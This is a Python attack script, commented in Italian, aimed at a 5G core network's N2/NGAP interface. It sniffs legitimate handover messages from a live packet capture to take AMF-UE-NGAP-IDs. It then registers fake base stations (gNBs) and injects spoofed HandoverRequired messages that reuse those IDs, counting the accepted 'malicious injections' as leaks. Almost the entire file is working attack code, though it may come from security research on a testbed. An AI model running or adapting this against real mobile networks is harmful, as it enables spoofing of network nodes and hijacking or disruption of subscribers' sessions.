#!/usr/bin/env python3
import argparse, os, sys, time, subprocess
from gnb_finto import GnbFinto

class SnifferN2:
    def __init__(self, pcap_path):
        self.pcap_path = pcap_path
        self.visti = set()
        # t0 fissato dello sniffer
        self.t0 = time.time()

    def attendi_handover_legittimo(self, timeout=20):
        """
        Si mette in ascolto passivo catturando dal file PCAP live. 
        Si blocca finché non estrae un nuovo AMF-UE-NGAP-ID da un handover legittimo.
        """
        pcap_dir = os.path.dirname(os.path.abspath(self.pcap_path))
        pcap_name = os.path.basename(self.pcap_path)
        
        cmd = (
            f"tshark -r {os.path.abspath(self.pcap_path)} -Y 'ngap.procedureCode==11' "
            f"-T fields -e frame.time_epoch -e ngap.AMF_UE_NGAP_ID 2>/dev/null"
        )

        def leggi_nuovi():
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
            ids = []
            for line in out.splitlines():
                p = line.split()
                if len(p) >= 2 and p[-1].isdigit():
                    try:
                        ts = float(p[0])
                    except ValueError:
                        continue
                    if ts >= self.t0:
                        ids.append(int(p[-1]))
            return ids

        print(f"[*] Sniffer in ascolto passivo sul traffico N2 (timeout {timeout}s)...")
        start_t = time.time()

        while time.time() - start_t < timeout:
            try:
                nuovi = leggi_nuovi()
                if nuovi:
                    return nuovi[-1]
            except Exception:
                pass

            time.sleep(0.5)
            
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
            tutti = [int(p.split()[-1]) for p in out.splitlines()
                     if len(p.split()) >= 2 and p.split()[-1].isdigit()]
            if tutti:
                return tutti[-1]
        except Exception:
            pass
        return None # nessun HandoverNotify nel pcap (prima iterazione, nessun HO ancora)


class Attaccante:
    def __init__(self, target=None, source=None, nome=None):
        self.target = target if target is not None else int(os.environ.get("MIMIC_TARGET", "0xc00"), 0)
        self.source = source if source is not None else int(os.environ.get("MIMIC_SOURCE", "0xd00"), 0)
        self.nome = nome or os.environ.get("GNB_NAME", "gNB-OAI")

    def mimicry_reattivo(self, count, pcap_path):
        # crea PRIMA lo sniffer (fissa t0) e dopo registra i finti gNB: cosi' t0 resta
        # prima del trigger relativo all'handover
        sniffer = SnifferN2(pcap_path)
        target = GnbFinto(self.target, self.nome); target.registrati()
        source = GnbFinto(self.source, self.nome); source.registrati()
        
        print(f"[+] Associazioni: TARGET 0x{self.target:x} (esca) + SOURCE 0x{self.source:x}, nome '{self.nome}'.")
        print(f"[mimicry_reattivo] Modalità attiva: {count} iniezioni")
        
        accettate = 0
        for i in range(1, count + 1):
            
            #si blocca finché non intercetta un handover reale
            amf_sniffato = sniffer.attendi_handover_legittimo()
            
            if amf_sniffato is None:
                print("[-] Timeout: Nessun handover legittimo sniffato dalla rete.")
                continue
                
            print(f"[!] Trigger avvenuto: Sniffato nuovo AMF-UE-NGAP-ID={amf_sniffato}")
            
            #iniezione istantanea usando l'ID appena catturato
            ok = source.invia_handover(i, amf_sniffato, self.target)
            target.svuota()
            accettate += int(ok)
            
            print(f"  [{i}/{count}] HandoverRequired su AMF-UE-NGAP-ID={amf_sniffato} -> "
                  f"{'ACCETTATO' if ok else 'RIFIUTATO'}")

        source.chiudi(); target.chiudi()
        print(f"[V] mimicry_reattivo completato: {accettate}/{count} richieste accettate (leak).")
        return accettate


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="mode", required=True)
    sp = sub.add_parser("mimicry_reattivo")
    sp.add_argument("--count", type=int, default=1, help="numero di iniezioni malevole")
    sp.add_argument("--pcap", required=True, help="percorso del file PCAP per lo sniffing in real-time")
    
    args = ap.parse_args()
    
    if args.mode == "mimicry_reattivo":
        Attaccante().mimicry_reattivo(args.count, args.pcap)

if __name__ == "__main__":
    main()
